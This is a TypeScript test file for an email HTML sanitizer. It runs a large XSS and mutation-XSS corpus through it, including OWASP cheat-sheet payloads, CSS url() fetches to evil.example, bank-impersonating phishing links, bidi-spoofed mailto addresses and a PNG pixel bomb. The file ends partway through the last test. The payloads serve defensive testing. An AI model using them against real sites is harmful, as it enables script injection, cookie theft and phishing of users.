import test from "node:test";
import assert from "node:assert/strict";
import { pngImage } from "./fixtures/html-mail.js";
import { HOSTILE_HTML, ITHOME_HTML, MEDIUM_HTML, PHOTO_HTML, WIDE_HTML } from "./fixtures/html-mail.js";
import { FRAME_CSP, mailDocument, readDocument, sanitizeMailHtml, settle, styleBlocks, type SanitizeOptions } from "./sanitize.js";

/**
 * The mail HTML sanitizer (SPEC-mail-html §3): a large XSS / mXSS corpus
 * (the OWASP filter-evasion cheat sheet, namespace confusion, raw-text
 * elements, CSS url() variants and escapes, data: URIs, srcset, meta
 * refresh, base, forms, handlers in odd spellings), each checked in both
 * image modes by an independent reading of the output: every tag and
 * attribute on the allowlist, every link http(s)/mailto, every image URL
 * one of ours, no CSS that fetches, runs or overlays — and the two passes
 * agree (or nothing is shown).
 */

const SIG = "A".repeat(43);
const options = (remote: SanitizeOptions["remote"], inline: string[] = []): SanitizeOptions => ({
  messageId: "msg1",
  remote,
  proxy: (url) => `/api/mail-images/proxy?m=msg1&u=${encodeURIComponent(url)}&s=${SIG}`,
  inline: new Set(inline),
});

const ALLOWED_TAGS = new Set([
  "a", "abbr", "address", "article", "aside", "b", "bdi", "bdo", "big", "blockquote", "br", "caption", "center", "cite", "code", "col",
  "colgroup", "dd", "del", "dfn", "div", "dl", "dt", "em", "figcaption", "figure", "font", "footer", "h1", "h2", "h3", "h4", "h5", "h6",
  "header", "hgroup", "hr", "i", "img", "ins", "kbd", "li", "main", "mark", "nav", "ol", "p", "pre", "q", "s", "samp", "section", "small",
  "span", "strike", "strong", "sub", "sup", "table", "tbody", "td", "tfoot", "th", "thead", "time", "tr", "tt", "u", "ul", "var", "wbr",
]);
const ALLOWED_ATTRIBUTES = new Set([
  "id", "class", "dir", "lang", "title", "align", "style", "href", "target", "rel", "src", "alt", "width", "height", "border", "hspace",
  "vspace", "cellpadding", "cellspacing", "bgcolor", "background", "valign", "colspan", "rowspan", "nowrap", "span", "color", "face",
  "size", "noshade", "start", "type", "value", "datetime",
]);
const OWN_IMAGE = /^(\/api\/gmail\/messages\/msg1\/inline\/[A-Za-z0-9%._~!*'()-]+|\/api\/mail-images\/proxy\?m=msg1&u=[A-Za-z0-9%._~!*'()-]+&s=[A-Za-z0-9_-]{43}|data:image\/(png|jpeg|gif|webp);base64,[A-Za-z0-9+/]+=*)$/;
const FORBIDDEN_CSS = /expression\s*\(|javascript:|vbscript:|behavior|binding|@import|@font-face|image-set|var\s*\(|attr\s*\(|position\s*:\s*(fixed|sticky|absolute)|\dvh\b|<|src\s*\(|color-scheme|\d{13}/i;

const decode = (value: string) => value.replace(/&quot;/g, "\"").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");

/** Every url(…) in CSS must be one of ours (or gone). */
function checkCss(css: string, label: string) {
  assert.doesNotMatch(css, FORBIDDEN_CSS, `${label}: css ${css.slice(0, 200)}`);
  for (const match of css.matchAll(/url\(([^)]*)\)/gi)) {
    const target = match[1].replace(/^"|"$/g, "");
    assert.match(target, OWN_IMAGE, `${label}: css url ${target}`);
  }
}

/**
 * Reads the sanitized markup independently of the sanitizer: every `<` must
 * open a well-formed tag on the allowlist (text is always escaped), every
 * attribute must be allowed, links must be absolute http(s)/mailto with
 * target/rel, image URLs must be ours, and styles must pass the CSS check.
 */
function checkMarkup(html: string, label: string) {
  const tag = /<(\/?)([a-z0-9]+)((?:\s+[a-z-]+(?:="[^"<>]*")?)*)\s*(\/?)>/gy;
  let index = 0;
  while (index < html.length) {
    const next = html.indexOf("<", index);
    if (next < 0) break;
    tag.lastIndex = next;
    const match = tag.exec(html);
    assert.ok(match, `${label}: a raw < that is not a clean tag at …${html.slice(next, next + 60)}`);
    const [, closing, name, attributes] = match;
    assert.ok(ALLOWED_TAGS.has(name), `${label}: tag <${name}>`);
    const attrs = new Map<string, string>();
    for (const attribute of attributes.matchAll(/([a-z-]+)(?:="([^"]*)")?/g)) {
      assert.ok(ALLOWED_ATTRIBUTES.has(attribute[1]), `${label}: attribute ${attribute[1]} on <${name}>`);
      attrs.set(attribute[1], decode(attribute[2] ?? ""));
    }
    // The only title is ours, on a link: a mail's own title inside a link would be the tooltip instead.
    if (attrs.has("title")) assert.equal(name, "a", `${label}: title on <${name}>`);
    if (name === "a" && !closing) assert.ok(attrs.has("href"), `${label}: a link without a target is a <span>`);
    if (attrs.has("href")) {
      assert.equal(name, "a", label);
      assert.match(attrs.get("href")!, /^(https?:\/\/[^\s]+|mailto:[^\s]*)$/i, `${label}: href ${attrs.get("href")}`);
      assert.equal(attrs.get("target"), "_blank", label);
      assert.equal(attrs.get("rel"), "noopener noreferrer", label);
      assert.match(attrs.get("title") ?? "", /^(連到|寄信給) /, `${label}: the real host is the tooltip`);
    }
    for (const key of ["src", "background"]) if (attrs.has(key)) assert.match(attrs.get(key)!, OWN_IMAGE, `${label}: ${key} ${attrs.get(key)}`);
    if (attrs.has("style")) checkCss(attrs.get("style")!, label);
    index = next + match[0].length;
  }
  assert.doesNotMatch(html, /<!--|<!\[CDATA|<\?/, `${label}: no comments, CDATA or processing instructions`);
}

const CORPUS: string[] = [
  // OWASP XSS filter evasion cheat sheet
  `<SCRIPT SRC=https://xss.rocks/xss.js></SCRIPT>`,
  `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`,
  `<IMG SRC="javascript:alert('XSS');">`,
  `<IMG SRC=JaVaScRiPt:alert('XSS')>`,
  "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
  `<a onmouseover="alert(document.cookie)">xxs link</a>`,
  `<IMG """><SCRIPT>alert("XSS")</SCRIPT>">`,
  `<IMG SRC=# onmouseover="alert('xxs')">`,
  `<IMG SRC= onmouseover="alert('xxs')">`,
  `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`,
  `<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">`,
  `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
  `<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
  `<IMG SRC="jav\tascript:alert('XSS');">`,
  `<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
  `<IMG SRC="jav&#x0A;ascript:alert('XSS');">`,
  `<IMG SRC=" &#14;  javascript:alert('XSS');">`,
  `<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>`,
  `<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^\`=alert("XSS")>`,
  `<<SCRIPT>alert("XSS");//\\<</SCRIPT>`,
  `<SCRIPT SRC=http://xss.rocks/xss.js?< B >`,
  "<IMG SRC=\"`<javascript:alert>`('XSS')\"",
  `<iframe src=http://xss.rocks/scriptlet.html <`,
  `</TITLE><SCRIPT>alert("XSS");</SCRIPT>`,
  `<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`,
  `<BODY BACKGROUND="javascript:alert('XSS')">`,
  `<IMG DYNSRC="javascript:alert('XSS')"><IMG LOWSRC="javascript:alert('XSS')">`,
  `<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`,
  `<svg/onload=alert('XSS')>`,
  `<BGSOUND SRC="javascript:alert('XSS');">`,
  `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`,
  `<STYLE>@import'http://xss.rocks/xss.css';</STYLE>`,
  `<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">`,
  `<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>`,
  `<STYLE>@im\\port'\\ja\\vasc\\ript:alert("XSS")';</STYLE>`,
  `<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">`,
  `<STYLE TYPE="text/javascript">alert('XSS');</STYLE>`,
  `<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>`,
  `<XSS STYLE="xss:expression(alert('XSS'))"><XSS STYLE="behavior: url(xss.htc);">`,
  `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`,
  `<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`,
  `<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">`,
  `<IFRAME SRC="javascript:alert('XSS');"></IFRAME><FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`,
  `<TABLE BACKGROUND="javascript:alert('XSS')"><TD BACKGROUND="javascript:alert('XSS')">x</TD></TABLE>`,
  `<DIV STYLE="background-image: url(javascript:alert('XSS'))">x</DIV>`,
  `<DIV STYLE="background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029">x</DIV>`,
  `<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">x</DIV>`,
  `<DIV STYLE="width: expression(alert('XSS'));">x</DIV>`,
  `<BASE HREF="javascript:alert('XSS');//">`,
  `<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>`,
  `<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`,
  `<isindex action=javascript:alert(1) type=image>`,
  `<img src=x:alert(alt) onerror=eval(src) alt=0>`,
  // Links
  `<a href="javas&#99;ript:alert(1)">x</a><a href="&#x6A;avascript:alert(1)">x</a><a href=" javascript:alert(1)">x</a><a href="jav&#x09;ascript:alert(1)">x</a>`,
  `<a href="vbscript:msgbox(1)">x</a><a href="data:text/html,<script>alert(1)</script>">x</a><a href="//evil.example/">x</a><a href="/relative">x</a><a href="#frag">x</a>`,
  `<a href="https://accounts.google.com@evil.example/login">login</a><a href="https://ok.example.com/" ping="https://evil.example/ping">x</a>`,
  `<a xlink:href="javascript:alert(1)">x</a><svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
  // Forms
  `<form action="https://evil.example"><input name=x><button formaction="javascript:alert(1)">x</button><select><option>a</option></select><textarea>t</textarea></form>`,
  // Mutation XSS: namespaces and raw text
  `<svg><script>alert(1)</script></svg>`,
  `<svg><style><img src=x onerror=alert(1)></style></svg>`,
  `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>`,
  `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;"></style>`,
  `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
  `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`,
  `<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">`,
  `<template><img src=x onerror=alert(1)></template>`,
  `<xmp><img src=x onerror=alert(1)></xmp>`,
  `<textarea><img src=x onerror=alert(1)></textarea>`,
  `<title><img src=x onerror=alert(1)></title>`,
  `<noembed><img src=x onerror=alert(1)></noembed>`,
  `<noframes><img src=x onerror=alert(1)></noframes>`,
  `<iframe><img src=x onerror=alert(1)></iframe>`,
  `<plaintext><img src=x onerror=alert(1)>`,
  `<!--<img src=x onerror=alert(1)>-->`,
  `<![CDATA[<img src=x onerror=alert(1)>]]>`,
  `<style>a{}<img src=x onerror=alert(1)>`,
  `<style>a{}</style ><img src=x onerror=alert(1)></style>`,
  `<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>`,
  // Handlers in odd spellings
  `<img src="x" ONERROR = "alert(1)">`,
  `<img src="x"/onerror="alert(1)">`,
  `<img src="x"\nonerror="alert(1)">`,
  `<img/src/onerror=alert(1)>`,
  `<IMG SRC=x OnErRoR=alert(1)>`,
  `<img src=x onerror\u000b=alert(1)>`,
  `<div onclick  =  "alert(1)" style="color:red">x</div>`,
  // srcset, picture, media
  `<img src="https://img.ithome.com.tw/a.png" srcset="https://evil.example/1x.png 1x, https://evil.example/2x.png 2x">`,
  `<picture><source srcset="https://evil.example/a.webp"><img src="https://img.ithome.com.tw/a.png"></picture>`,
  `<video poster="https://evil.example/p.png"><source src="x.mp4"></video><audio src="x.mp3"></audio>`,
  // CSS
  `<div style="position:fixed;top:0;left:0;width:100%;height:100%">overlay</div><div style="position: sticky ;top:0">sticky</div>`,
  `<style>.a{position:absolute}</style><div class="a">a</div>`,
  `<style>/* @import url(https://evil.example/x.css); */ .a{color:red}</style>`,
  `<style>@\\69mport url(https://evil.example/x.css);</style>`,
  `<style>.a{background:u\\72l(https://evil.example/x.png)}</style>`,
  `<style>.a{background:\\75 rl(https://evil.example/x.png)}</style>`,
  `<style>.a{background:url/**/(https://evil.example/x.png)}</style>`,
  `<style>.a{background:URL( "https://img.ithome.com.tw/x.png" )}</style>`,
  `<style>.a{background-image:image-set("https://evil.example/x.png" 1x)}</style>`,
  `<style>.a{content:"</style><script>alert(1)</script>"}</style>`,
  `<style>.a{content:"\\3c/style\\3e"}</style>`,
  `<style>.a{width:100vh}</style>`,
  `<style>@font-face{font-family:x;src:url(https://evil.example/f.woff)}</style>`,
  `<style>@media (min-width:600px){.a{background:url(https://img.ithome.com.tw/m.png)}}</style>`,
  `<style>@media url(x){.a{color:red}}</style>`,
  `<style>.a{--x:url(https://evil.example/v.png);background:var(--x)}</style>`,
  `<style>.a{background:attr(data-x url)}</style>`,
  `<style>.a{cursor:url(https://evil.example/c.cur),auto;list-style:url(https://evil.example/l.png)}</style>`,
  `<style>.a{background:url(cid:logo@x)}</style><div class="a"></div>`,
  `<style>@namespace url(http://www.w3.org/1999/xhtml); @keyframes k{from{color:red}} @supports (display:grid){.a{color:red}} @layer x{.a{color:red}}</style>`,
  `<div style="width:100000px;font-size:99999px;line-height:500">huge</div>`,
  `<div style="background:url(javascript:alert(1))">x</div><div style="background:url(data:text/html,alert(1))">y</div>`,
  // Documents
  `<meta http-equiv="Content-Security-Policy" content="img-src *"><base href="https://evil.example/"><link rel=import href="https://evil.example/x.html">`,
  `<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="><img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`,
  `<img src="data:image/png;base64,PGh0bWw+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PjwvaHRtbD4=" alt="not a png">`,
  // Tooltips and links (review findings)
  `<a href="https://evil.example/login"><span title="連到 www.esunbank.com.tw" style="display:block">登入玉山網銀</span></a><a href="https://evil.example/"><img title="連到 www.esunbank.com.tw" alt="x"><abbr title="x">y</abbr></a>`,
  `<a href="mailto:%E2%80%AEmoc.knabnuse@evil.example">聯絡客服</a><a href="mailto:a%E2%80%8Bb@x.com">x</a><a href="mailto:%E2%81%A6x@y.com">y</a>`,
  `<a href="#details">看下方明細</a><a href="tel:0800000000">客服</a><a name="top">top</a><a>bare</a>`,
  // CSS that freezes the server or escapes the caps (review findings)
  `<p style="width:0001${"1".repeat(1995)}">x</p><style>.a{width:${"1".repeat(1999)}}</style>`,
  `<div style="width:1e9px;height:1E9px;zoom:10000;transform:scale(10000);line-height:1e9">x</div><div style="width:calc(5000px * 5000)">y</div>`,
  `<div style='content:\\"x foo(1) \\"'>x</div><div style='width:\\"x if(media(pointer:coarse): 10px) \\"'>y</div>`,
  `<style>:root{color-scheme:light dark}@media (prefers-color-scheme: dark){.t{color:#fff}}</style><meta name="color-scheme" content="dark"><p class="t">x</p>`,
  HOSTILE_HTML,
];

test("the XSS / mXSS corpus: nothing that runs, embeds, submits, navigates, fetches or overlays survives, in either image mode", () => {
  for (const [index, html] of CORPUS.entries()) {
    for (const mode of ["block", "proxy"] as const) {
      const label = `#${index} ${mode}`;
      const result = sanitizeMailHtml(html, options(mode, ["logo@x"]));
      if (!result.stable) {
        assert.equal(result.body, "", `${label}: an unstable result is never shown`);
        continue;
      }
      checkMarkup(result.body, label);
      checkCss(result.css, label);
      // Text may quote a payload (escaped, inert); markup and CSS may not carry one.
      const markup = result.body.replace(/>[^<]*</g, "><");
      assert.doesNotMatch(markup + result.css, /alert\(|xss\.rocks/i, `${label}: no payload in markup or CSS`);
      const document = mailDocument(result);
      assert.ok(document.startsWith(`<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="${FRAME_CSP}">`), label);
      assert.doesNotMatch(document, /<script|<base|<link|<iframe|<object|<embed|<svg|<math|<form/i, label);
      if (mode === "block") assert.doesNotMatch(result.body + result.css, /\/api\/mail-images\/proxy/, `${label}: no remote image while blocked`);
    }
  }
});

test("what is served is a fixpoint: sloppy markup settles, markup read two ways is never shown", () => {
  for (const html of CORPUS) assert.ok(sanitizeMailHtml(html, options("proxy")).stable, html.slice(0, 60));
  // A <body> inside a <p> and a stray </p> take one more round to settle; the settled round is served.
  const sloppy = sanitizeMailHtml(`<p><body bgcolor="red"><b>x</b></p></p><td>y`, options("block"));
  assert.ok(sloppy.stable);
  assert.equal(sanitizeMailHtml(sloppy.body, options("block")).body, sloppy.body);
  // The guard itself: output that keeps changing, or that still holds a <style>, is refused.
  assert.equal(settle("<p>a</p>", (body) => ({ body: `${body}<p>a</p>`, styles: 0 })), undefined);
  assert.equal(settle("<p>a</p>", () => ({ body: "<p>a</p>", styles: 1 })), undefined);
  assert.equal(settle("<style>x</style>", (body) => ({ body, styles: 0 })), undefined);
  assert.equal(settle("<p>a</p>", (body) => ({ body, styles: 0 })), "<p>a</p>");
  assert.equal(settle("<p>a", () => ({ body: "<p>a</p>", styles: 0 })), "<p>a</p>");
});

test("a real newsletter keeps its layout: tables, classes, inline styles, <style> rules and @media; remote images become empty boxes until allowed", () => {
  const blocked = sanitizeMailHtml(ITHOME_HTML, options("block"));
  assert.ok(blocked.stable);
  assert.deepEqual([blocked.remote, blocked.trackers], [6, 2], "logo, hero, three thumbnails and a spacer; the 1×1 and display:none pixels");
  assert.match(blocked.body, /<table class="card" width="600" cellpadding="0" cellspacing="0" style="max-width:600px;width:100%">/);
  assert.match(blocked.body, /<img alt="零信任架構實戰" width="600" height="240" \/>/, "a blocked image keeps its box and alt text");
  assert.doesNotMatch(blocked.body, /list-manage|ithome\.com\.tw\/newsletter|eJxVjU1/, "no remote image URL, no pixel");
  assert.match(blocked.body, /<a href="https:\/\/www\.ithome\.com\.tw\/news\/171234" target="_blank" rel="noopener noreferrer" title="連到 www\.ithome\.com\.tw">/);
  assert.match(blocked.css, /@media only screen and \(max-width:480px\)\{\.item \.thumb\{display:none !important\}/);
  assert.match(blocked.css, /\.btn\{display:inline-block;background:#0b63ce;color:#ffffff !important;/);

  const shown = sanitizeMailHtml(ITHOME_HTML, options("proxy"));
  assert.deepEqual([shown.remote, shown.trackers], [6, 2]);
  assert.match(shown.body, /<img src="\/api\/mail-images\/proxy\?m=msg1&amp;u=https%3A%2F%2Fimg\.ithome\.com\.tw%2Fnewsletter%2F2026%2Fhero\.png&amp;s=A{43}" alt="零信任架構實戰" width="600" height="240" \/>/);
  assert.doesNotMatch(shown.body, /list-manage|eJxVjU1/, "tracking pixels stay out when images are shown");

  const medium = sanitizeMailHtml(MEDIUM_HTML, options("proxy"));
  assert.match(medium.css, /\.head\{height:160px;background:#242424 url\("\/api\/mail-images\/proxy\?m=msg1&u=https%3A%2F%2Fcdn-images\.medium-mail\.com%2Fheader\.png&s=A{43}"\) center\/cover no-repeat;/);
  assert.equal(medium.trackers, 1);
  const mediumBlocked = sanitizeMailHtml(MEDIUM_HTML, options("block"));
  assert.match(mediumBlocked.css, /\.head\{height:160px;background:#242424 none center\/cover no-repeat;/, "a blocked url() becomes none; the colour stays");

  const wide = sanitizeMailHtml(WIDE_HTML, options("block"));
  assert.match(wide.body, /<table width="720" cellpadding="0" cellspacing="0" align="center" style="width:720px;/);
  assert.match(wide.body, /<div style="margin:0;background:#fafafa">/, "the mail's <body> became a div that keeps its style");
});

test("cid: images point at this message's own parts; unknown parts, svg and mismatched data: images are dropped", () => {
  const photo = sanitizeMailHtml(PHOTO_HTML, options("block", ["arch-diagram@cs.nycu.edu.tw"]));
  assert.match(photo.body, /<img src="\/api\/gmail\/messages\/msg1\/inline\/arch-diagram%40cs\.nycu\.edu\.tw" alt="架構圖" width="580" height="240" style="border:1px solid #ddd" \/>/);
  assert.deepEqual([...photo.inline], ["arch-diagram@cs.nycu.edu.tw"]);
  assert.equal(photo.remote, 0);

  const png = pngImage(4, 3, () => [10, 20, 30]).toString("base64");
  const mixed = sanitizeMailHtml(
    `<img src="cid:ARCH-DIAGRAM@cs.nycu.edu.tw" alt="a"><img src="cid:missing@x" alt="b"><img src="data:image/png;base64,${png}" alt="c"><img src="data:image/jpeg;base64,${png}" alt="d"><img src="data:image/png;base64,${Buffer.alloc(300_000, 1).toString("base64")}" alt="e">`,
    options("block", ["arch-diagram@cs.nycu.edu.tw"]),
  );
  assert.match(mixed.body, /<img src="\/api\/gmail\/messages\/msg1\/inline\/arch-diagram%40cs\.nycu\.edu\.tw" alt="a" \/>/, "Content-IDs match case-insensitively");
  assert.match(mixed.body, /<img alt="b" \/>/);
  assert.match(mixed.body, new RegExp(`<img src="data:image/png;base64,${png.replace(/[+/]/g, (char) => `\\${char}`)}" alt="c" />`));
  assert.match(mixed.body, /<img alt="d" \/>/, "declared jpeg, bytes png: dropped");
  assert.match(mixed.body, /<img alt="e" \/>/, "over the data: cap: dropped");
});

test("tracking pixels by size, style or host are removed and counted, also when images are shown", () => {
  const html = [
    `<img src="https://a.com/1.gif" width="1" height="1">`,
    `<img src="https://a.com/2.gif" width="0">`,
    `<img src="https://a.com/3.gif" style="width:1px;height:1px">`,
    `<img src="https://a.com/4.gif" style="display:none">`,
    `<img src="https://a.com/5.gif" style="visibility:hidden">`,
    `<img src="https://a.com/6.gif" style="opacity:0">`,
    `<img src="https://u1.ct.sendgrid.net/wf/open?upn=x">`,
    `<img src="https://mailtrack.io/trace/mail/abc.png">`,
    `<img src="https://news.shop.com/wf/open?x=1">`,
    `<img src="https://a.com/hero.png" width="600" height="1" alt="spacer">`,
    `<img src="cid:pixel@x" width="1" height="1" alt="local">`,
  ].join("");
  for (const mode of ["block", "proxy"] as const) {
    const result = sanitizeMailHtml(html, options(mode, ["pixel@x"]));
    assert.equal(result.trackers, 9, mode);
    assert.equal(result.remote, 1, `${mode}: only the 600×1 spacer is a real image`);
    assert.doesNotMatch(result.body, /a\.com%2F[1-6]|sendgrid|mailtrack|wf%2Fopen/, mode);
    assert.match(result.body, /alt="local"/, `${mode}: a pixel from Gmail itself tracks nobody`);
  }
});

test("pathological input stays fast: nested raw-text fallbacks, deep nesting, a megabyte of styled rows", () => {
  const cases = [
    "<iframe>".repeat(5000) + "<img src=x onerror=alert(1)>",
    "<div>".repeat(20000) + "deep",
    "<style>" + "a{color:red}".repeat(20000) + "</style>",
    // About the 1 MB the endpoint accepts: one style repeated, then every style different.
    `<p style="${"color:red;".repeat(400)}">x</p>`.repeat(240),
    Array.from({ length: 240 }, (_, index) => `<p style="${Array.from({ length: 400 }, (__, n) => `margin:${index}px ${n}px`).join(";")}">x</p>`).join(""),
    "<table><tr><td>".repeat(3000),
    "<a href=\"https://a.com/\">" .repeat(5000),
    "<style>" + "/*".repeat(50000) + "</style>",
    // Thousands of removed pixels and of <style> elements after a lot of text: no per-element copy of the output.
    `<p>${"x".repeat(100)}</p>`.repeat(3000) + "<img src=\"https://a.com/p.gif\" width=\"1\" height=\"1\">".repeat(10000),
    "<p>text</p><style>a{color:red}</style>".repeat(30000),
  ];
  for (const html of cases) {
    const started = performance.now();
    const result = sanitizeMailHtml(html, options("proxy"));
    const ms = performance.now() - started;
    assert.ok(ms < 2500, `${html.slice(0, 20)}… took ${Math.round(ms)} ms`);
    if (result.stable) checkMarkup(result.body, html.slice(0, 20));
  }
});

test("the frame's page: CSP first, no referrer, white paper in system colours, natural height, the mail's CSS between base and overrides", () => {
  const page = mailDocument({ body: "<p>hi</p>", css: ".x{color:red}" });
  assert.match(page, /^<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'none'; object-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; font-src 'none';[^"]*form-action 'none'; base-uri 'none'">/);
  assert.match(page, /<meta name="referrer" content="no-referrer">/);
  assert.match(page, /color-scheme:light/);
  assert.match(page, /html\{background:Canvas;color:CanvasText/);
  assert.ok(page.indexOf(".x{color:red}") > page.indexOf("img{max-width:100%"), "the mail's CSS after the base");
  assert.ok(page.indexOf("height:auto!important") > page.indexOf(".x{color:red}"), "the overrides after the mail's CSS");
  assert.match(page, /<body><div class="bell-mail"><p>hi<\/p><\/div><\/body><\/html>$/);
  assert.doesNotMatch(FRAME_CSP, /frame-ancestors|sandbox|report-uri/, "directives a <meta> CSP ignores would only print console errors");
});

test("style blocks are read in order, except inside containers that are not part of the page", () => {
  const html = `<head><style>.a{color:red}</style></head><svg><style>.svg{color:blue}</style></svg><template><style>.t{}</style></template>`
    + `<noscript><style>.n{}</style></noscript><math><style>.m{}</style></math><body><style>.b{margin:0}</style><embed src=x><style>.c{}</style></body>`;
  assert.deepEqual(styleBlocks(html), [".a{color:red}", ".b{margin:0}", ".c{}"]);
  assert.deepEqual(styleBlocks("<style>" + "a{}".repeat(100) + "</style><style>b{}</style>", 10), ["a{}a{}a{}a", ""], "the character budget");
  assert.deepEqual(styleBlocks("<style>a{}<img src=x onerror=alert(1)>"), ["a{}<img src=x onerror=alert(1)>"], "raw text to the end: only CSS ever reads it");
  assert.equal(sanitizeMailHtml("<style>a{}<img src=x onerror=alert(1)>", options("block")).css, "", "and the CSS sanitizer keeps nothing of it");
});

test("links: the real host is the only tooltip, a hidden-direction address is no link, a link to nowhere is plain text", () => {
  const spoof = sanitizeMailHtml(`<a href="https://evil.example/login"><span title="連到 www.esunbank.com.tw" style="display:block;padding:10px">登入玉山網銀</span><img src="cid:logo@x" title="連到 www.esunbank.com.tw" alt="logo"></a><p title="hello">x</p>`, options("block", ["logo@x"]));
  assert.equal(spoof.body, `<a href="https://evil.example/login" target="_blank" rel="noopener noreferrer" title="連到 evil.example"><span style="display:block;padding:10px">登入玉山網銀</span><img src="/api/gmail/messages/msg1/inline/logo%40x" alt="logo" /></a><p>x</p>`);

  const bidi = sanitizeMailHtml(`<a href="mailto:%E2%80%AEmoc.knabnuse@evil.example">聯絡客服</a> <a href="mailto:service@esunbank.com.tw?subject=hi">寄信</a>`, options("block"));
  assert.equal(bidi.body, `<span>聯絡客服</span> <a href="mailto:service@esunbank.com.tw?subject=hi" target="_blank" rel="noopener noreferrer" title="寄信給 service@esunbank.com.tw">寄信</a>`, "the RLO address would read as another one: no link, no tooltip");

  const dead = sanitizeMailHtml(`<a href="#details" class="more" style="color:#06c">看下方明細</a><a href="tel:0800000000">客服專線</a><a href="javascript:alert(1)">立即驗證</a><a name="top"></a>`, options("block"));
  assert.equal(dead.body, `<span class="more" style="color:#06c">看下方明細</span><span>客服專線</span><span>立即驗證</span><span></span>`);
  assert.ok(sanitizeMailHtml(dead.body, options("block")).stable);
  assert.match(mailDocument(dead), /a\[href\]\{color:LinkText\}/, "only real links get the link colour");
});

test("the mail's <html> direction and language survive on the frame's wrapper", () => {
  const rtl = sanitizeMailHtml(`<!doctype html><html dir="RTL" lang="ar"><head><style>.box{text-align:right}</style></head><body><div class="box"><p>تم شحن طلبك.</p></div></body></html>`, options("block"));
  assert.deepEqual([rtl.dir, rtl.lang], ["rtl", "ar"]);
  assert.match(mailDocument(rtl), /<body><div class="bell-mail" dir="rtl" lang="ar"><div><div class="box"><p>تم شحن طلبك\.<\/p><\/div><\/div><\/div><\/body>/);
  assert.deepEqual(readDocument(`<html dir="sideways" lang="x&quot; onload=&quot;1"><html dir="rtl">`), { styles: [] }, "only checked values, and only the first <html>");
  assert.match(mailDocument(sanitizeMailHtml(`<html lang="ja"><p>漢字</p>`, options("block"))), /<div class="bell-mail" lang="ja">/);
  assert.match(mailDocument({ body: "<p>x</p>", css: "" }), /<div class="bell-mail"><p>x<\/p><\/div>/);
});

test("the paper is light whatever the system uses: the mail cannot set color-scheme and dark queries never apply", () => {
  const mail = sanitizeMailHtml(`<head><meta name="color-scheme" content="light dark"><style>:root{color-scheme:light dark}.txt{color:#1a1a1a}@media (prefers-color-scheme: dark){.txt{color:#f2f2f2 !important}}</style></head><p class="txt" style="color-scheme:dark">x</p>`, options("block"));
  assert.equal(mail.css, ".txt{color:#1a1a1a}");
  assert.equal(mail.body, `<p class="txt">x</p>`);
  const page = mailDocument(mail);
  assert.ok(page.indexOf("html:root{color-scheme:light only!important}") > page.indexOf(".txt{color:#1a1a1a}"), "the override comes after the mail's CSS");
});

test("a data: image that decodes to too many pixels is dropped, whatever its file size", () => {
  // 23000×23000 declared in a few bytes: the reader's tab would allocate gigabytes.
  const bomb = Buffer.from(pngImage(4, 3, () => [10, 20, 30]));
  bomb.writeUInt32BE(23_000, 16);
  bomb.writeUInt32BE(23_000, 20);
